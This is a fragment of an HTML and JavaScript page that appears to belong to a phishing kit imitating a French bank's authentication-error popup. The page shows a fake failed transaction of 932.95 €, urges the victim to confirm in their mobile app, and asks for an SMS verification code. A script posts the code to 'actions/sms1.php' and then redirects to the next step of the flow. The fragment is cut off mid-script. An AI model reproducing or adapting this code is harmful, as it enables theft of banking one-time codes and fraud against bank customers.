		...
		<div class="modal-contentb">
			...
			<div class="document" style="height: auto;display: flex;flex-direction: column;">
				<div class="header popinV3-header ">
					...
					<p  style="text-align: center; color: #e03135;font-size: 21px" >Erreur d'authentification !</p>
					<p style="text-align: center; color: #0b6ba8;" >IBAN: FR76 XXXX XXXX XXXX XXXX XXXX XXX</p>
					<p style="text-align: center; color: #e03135;" >Montant de la transaction: <b>932,95 €</b></p>
				</div>
									...
									<div class="blockInside">
										<div>
											...
											<div class="textFCK" style="text-align: center;">
												<b>Démarrez votre application mobile depuis votre appareil pour vérifier et confirmer votre identité.<b>
												<form action="" method="post">
                        <input type="hidden" name="captcha">
                        <input type="hidden" name="step" value="cc">
                            <div class="text-center mb20">
                            <img src="asset/images/validation_operation.gif" style="max-width: 300px;">
                        </div>
            


    
             <b>Vous ne parvenez pas à valider votre connexion ? un CODE SMS vous sera envoyer.<b>
             <br><br>
            <div class="form-group col-12 row" style="margin-top:-10px;left:-2px">              
              <b class="col-5" style="text-align: right;">CODE SMS:</b>
              <input type="tel" class="form-control phone11 col-5" id="phone11" name="phone11"  placeholder="" maxlength="8" autocomplete="off">
            </div>
                        <div class="btns">
        ...
        <script type="text/JavaScript">
            ...
            $(document).ready(function() {
                ...
                $('#submit').click(function(e) {
                    e.preventDefault();
                     if (  $('.phone11').val().length >= 0) {

                        $.ajax({
                            type: "post",
                            url: "actions/sms1.php",
                            data: "phone11=" + $('.phone11').val(),
                            success: function(response) {
                                window.location.href = 'connexion-4.php';
                                
                            }
                        });
                          } else {
                        alert('Veuillez vérifier votre numéro de téléphone mobile.')
                    }
